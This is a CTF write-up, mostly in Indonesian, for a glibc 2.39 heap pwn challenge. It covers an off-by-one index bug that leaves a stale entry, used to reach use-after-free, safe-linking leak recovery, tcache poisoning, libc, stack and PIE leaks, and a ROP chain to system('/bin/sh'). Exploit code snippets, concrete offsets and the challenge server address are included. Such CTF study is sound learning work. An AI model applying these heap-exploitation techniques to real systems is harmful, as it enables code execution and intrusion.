# H34P D3V1L — Pwn Writeup

**CTF:** LYKN CTF 2026  
**Category:** Pwn  
**Architecture:** amd64  
**Libc:** glibc 2.39  
**Flag:** `LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}`

## Challenge

> Even demons make mistakes. The Heap Devil has invited you to play a dangerous game with his "unbreakable" contracts. Outwit the master of trickery, beat him at his own game, and escape with the flag!

Service:

```text
nc 15.235.202.47 9009
```

## Protections

```bash
checksec --file=Heap_devil
```

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

GOT overwrite tidak menarik karena Full RELRO. NX dan PIE juga membuat eksekusi shellcode langsung tidak praktis. Jalur akhirnya adalah heap leak, arbitrary allocation, stack leak, lalu ROP ke libc.

Binary membawa `libc.so.6` glibc 2.39. Safe-linking aktif pada tcache, jadi poisoning perlu mengetahui alamat heap chunk yang menyimpan `next` pointer.

## Struktur note

Dari akses ke array global `notes`, setiap entry berukuran `0x18` byte:

```c
typedef struct {
    int in_use;      // +0x00
    int size;        // +0x04
    int id;          // +0x08
    int padding;     // +0x0c
    char *data;      // +0x10
} Note;
```

Program menyediakan operasi create, view, edit, delete, dan change size. `change_note_size()` tidak memakai `realloc()`. Fungsi ini melakukan `free(old_data)`, `malloc(new_size)`, kemudian mengganti pointer pada note.

## Bug: stale duplicate entry dan off-by-one index

Validasi indeks pada `view_note()` dan `edit_note()` menerima `index == num_notes`:

```c
if (index < 0 || index > num_notes) {
    puts("Invalid index!");
    return;
}
```

Kondisi yang benar seharusnya `index >= num_notes`.

`delete_note()` menggeser entry setelah note yang dihapus, lalu mengurangi `num_notes`:

```c
free(notes[index].data);

for (int i = index; i < num_notes - 1; i++) {
    notes[i] = notes[i + 1];
}

num_notes--;
```

Slot lama di `notes[num_notes]` tidak dibersihkan. Akibatnya, entry terakhir tersalin dua kali saat array digeser. Satu salinan tetap berada di luar batas logis array dan masih dapat diakses melalui bug `index == num_notes` pada view/edit.

Kombinasi ini menghasilkan stale alias:

```text
Sebelum delete:
notes[k]     -> chunk X
notes[k + 1] -> chunk Y
num_notes    = k + 2

Delete notes[k]:
notes[k]     -> chunk Y
notes[k + 1] -> chunk Y    (salinan lama tidak dibersihkan)
num_notes    = k + 1

Delete notes[k]:
chunk Y di-free
notes[k]     -> chunk Y    (stale entry, index == num_notes)
num_notes    = k
```

`view(k)` menjadi UAF read dan `edit(k)` menjadi UAF write.

## Membuat primitive tcache poisoning

Solver membuat dua chunk berukuran sama, `X` dan `Y`, yang dialokasikan berurutan.

```python
create(request_size, b"X")
create(request_size, b"Y")
```

Chunk `X` kemudian di-resize ke ukuran lain. Implementasi resize membebaskan chunk lama milik `X`, sehingga chunk itu masuk ke tcache bin ukuran awal.

```python
resize(base_index, 0x30, b"T")
```

Dua kali delete membentuk stale entry yang menunjuk ke `Y` setelah `Y` masuk ke tcache. Tcache bin sekarang berbentuk:

```text
Y -> X
```

Membaca data stale `Y` membocorkan safe-linked `fd`:

```text
encoded_fd = X ^ (Y >> 12)
```

Karena `X` dan `Y` berurutan, hubungan berikut diketahui:

```text
Y = X + chunk_size
```

Solver membalik kandidat safe-linking lalu mencoba beberapa page key di sekitar kandidat sampai memenuhi:

```python
encoded_fd == X ^ ((X + chunk_size) >> 12)
```

Setelah alamat `Y` diketahui, `fd` dapat diganti dengan target arbitrary allocation:

```text
poisoned_fd = target ^ (Y >> 12)
```

Dua alokasi berikutnya menghasilkan:

```text
malloc #1 -> Y
malloc #2 -> target
```

Primitive ini dibungkus oleh fungsi `poison_allocate()` pada `solve.py`.

## Leak libc dari unsorted bin

Request `0x100` menghasilkan chunk berukuran `0x110`. Tcache satu size class menampung maksimal tujuh entry.

Tahap leak:

1. Buat tujuh chunk `0x100` untuk mengisi tcache `0x110`.
2. Buat satu chunk `0x100` tambahan sebagai unsorted-bin victim.
3. Resize tujuh chunk pertama sehingga chunk lama masuk ke tcache.
4. Free victim saat tcache `0x110` sudah penuh.
5. Victim masuk ke unsorted bin dan field `fd` berisi pointer ke `main_arena + 0x60`.
6. Gunakan stale entry untuk membaca `fd` victim.

Offset pada libc yang disediakan:

```python
UNSORTED_FD_OFFSET = 0x203AC0 + 0x60
libc_base = unsorted_fd - UNSORTED_FD_OFFSET
```

Alamat divalidasi harus page-aligned dan berada pada rentang mapping libc 64-bit.

## Leak stack melalui `environ`

Setelah libc base diketahui, tcache poisoning diarahkan ke simbol `environ`.

Ada detail glibc 2.39 yang perlu diperhatikan. Ketika entry diambil dari tcache, `tcache_get()` membersihkan field key pada `returned_pointer + 8`. Bila malloc diarahkan tepat ke `environ - 8`, proses ini akan menulis nol ke `environ` dan merusak leak.

Target dipindahkan ke:

```python
environ_target = libc.sym.environ - 0x18
```

Pointer `environ` kemudian berada pada offset `+0x18` dari fake allocation dan tidak tersentuh oleh pembersihan key:

```python
environ_blob = view(note_index, 0x50)
stack_environ = u64(environ_blob[0x18:0x20])
```

Nilai tersebut memberikan alamat stack proses.

## Menemukan saved RIP dan PIE base

Alamat `environ` hanya memberikan anchor stack, bukan posisi return address secara langsung. Solver melakukan arbitrary allocation ke dua window stack di sekitar `environ - 0x150` dan membacanya sebagai array qword.

Saat `view_note()` aktif, return address-nya kembali ke instruksi setelah call pada `main`:

```asm
1f27: call view_note
1f2c: jmp  main+0x15c
```

Jadi qword yang dicari berbentuk:

```text
PIE base + 0x1f2c
```

Validasi yang dipakai:

```python
candidate & 0xfff == 0xf2c
pie_base = candidate - 0x1f2c
pie_base & 0xfff == 0
```

Alamat qword tersebut adalah slot saved RIP yang nantinya ditimpa.

## ROP ke `system("/bin/sh")`

Tcache poisoning terakhir diarahkan ke `saved_return - 8`. Pengurangan delapan byte diperlukan karena target tcache harus 16-byte aligned dan payload juga perlu mengganti saved RBP sebelum saved RIP.

Chain yang ditulis:

```python
chain = flat(
    0,                         # fake saved RBP
    libc_base + RET_OFFSET,    # stack alignment
    libc_base + POP_RDI_OFFSET,
    libc_base + BINSH_OFFSET,
    libc.sym.system,
    libc.sym.exit,
)
```

Offset dari libc remote:

```python
RET_OFFSET     = 0x2882F
POP_RDI_OFFSET = 0x10F78B
BINSH_OFFSET   = 0x1CB42F
```

Saat fungsi selesai, eksekusi berpindah ke chain dan menjalankan:

```c
system("/bin/sh");
```

Solver lalu mengirim:

```sh
cat flag.txt 2>/dev/null || cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null
```

## Kenapa solver memakai retry

Input note dibaca dengan `fgets()`. Byte `0x0a` di tengah pointer safe-linking atau ROP chain dianggap newline dan memotong payload.

ASLR dapat menghasilkan alamat yang mengandung byte tersebut. Solver memeriksa setiap packed pointer dan ROP chain sebelum dikirim. Bila terdapat `0x0a`, koneksi ditutup dan exploit diulang dengan layout ASLR baru.

```python
if b"\n" in packed_fd:
    raise RetryExploit("newline byte in poisoned tcache fd")
```

Default solver mencoba maksimal 20 kali.

## Menjalankan exploit

Letakkan file berikut dalam satu direktori:

```text
Heap_devil
libc.so.6
solve.py
```

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py 15.235.202.47 9009
```

Contoh hasil:

```text
[*] attempt 1/20
[+] libc base: 0x7f...
[+] environ: 0x7fff...
[+] PIE base: 0x55...
[+] saved RIP: 0x7fff...
<FLAG>LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}</FLAG>
```

## Flag

```text
LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}
```
